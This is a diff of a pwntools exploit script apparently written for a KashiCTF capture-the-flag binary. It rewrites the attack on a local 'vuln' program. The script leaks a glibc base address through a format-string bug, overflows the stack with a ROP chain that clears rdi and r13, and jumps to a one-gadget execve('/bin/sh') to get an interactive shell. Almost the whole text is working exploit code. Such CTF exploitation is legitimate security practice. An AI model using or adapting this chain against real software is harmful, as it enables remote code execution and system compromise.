@@ -1,57 +1,36 @@
 from pwn import *
 
+context.arch = 'amd64'
 context.log_level = 'debug'
 context.terminal = ['tmux', 'splitw', '-h']
 
-p = gdb.debug(['./ld-linux-x86-64.so.2', '--library-path', '.', './vuln'], '''
-    file vuln
-    ni
-    ni          
+p = gdb.debug('./vuln_patched', '''      
     b *(troll+127)
     b *(main+60)
-    b *(main+90)
     continue
 ''')
 
 # p = remote('kashictf.iitbhucybersec.in', 54468)
 
-p.recvuntil(b'What do you want? ')
-p.sendline(b'%p')
+# 1. leak glibc base address with format string
+p.sendlineafter(b"What do you want? ", b'%17$p')
 p.recvuntil(b'Lmao not giving you ')
-saved_rbp_1 = int(p.recvuntil(b'\n').decode().strip()[0:14], 16) + 0x2170
-log.info(f'saved_rbp_1: {hex(saved_rbp_1)}')
+glibc_base_addr = int(p.recvuntil(b"\n", drop=True)[0:14], 16)-0x2724a
+log.info(f"glibc base address: {hex(glibc_base_addr)}")
 
-e = ELF('./vuln')
-r = ROP('./vuln')
-chain1 = [
-    r.ret.address,
-    e.plt.printf,
-    0x401241
-]
-p.recvuntil(b'Wanna Cry about that? ')
-payload1 = b'A' * 0x20 + p64(saved_rbp_1) + b''.join([p64(c) for c in chain1])
-p.sendline(payload1)
-p.recvuntil(b'Still not giving a shit bye hahaha')
-glibc_base_addr = u64(p.recv(6).ljust(8, b'\x00')) - 0x51fd0
-log.info(f'glibc_base_addr: {hex(glibc_base_addr)}')
-
-p.recvuntil(b'What do you want? ')
-p.sendline(b'%p')
-p.recvuntil(b'Lmao not giving you ')
-saved_rbp_2 = int(p.recvuntil(b'\n').decode().strip()[0:14], 16) + 0x2170
-log.info(f'saved_rbp_2: {hex(saved_rbp_2)}')
-
+# 2. ROP with one gadget
+# 0xd511f execve("/bin/sh", rbp-0x40, r13)
+# constraints:
+#   address rbp-0x38 is writable
+#   rdi == NULL || {"/bin/sh", rdi, NULL} is a valid argv
+#   [r13] == NULL || r13 == NULL || r13 is a valid envp
 glibc_r = ROP('./libc.so.6')
-chain2 = [
-    glibc_r.rdi.address + glibc_base_addr,  # pop rdi; ret
-    0x0,    # NULL
-    glibc_r.r13.address + glibc_base_addr,  # pop r13; ret
-    0x0,    # NULL
-    0xd511f + glibc_base_addr  # one gadget
+chain = [
+    glibc_base_addr+glibc_r.rdi.address, 0,
+    glibc_base_addr+glibc_r.r13.address, 0,
+    glibc_base_addr+0xd511f
 ]
-p.recvuntil(b'Wanna Cry about that? ')
-payload2 = b'A' * 0x20 + p64(saved_rbp_2+0x38) + b''.join([p64(c) for c in chain2])
-p.sendline(payload2)
+p.sendlineafter(b"Wanna Cry about that? ", b'A'*0x20+p64(0x404800)+b''.join([p64(c) for c in chain]))
 
 p.interactive()
 
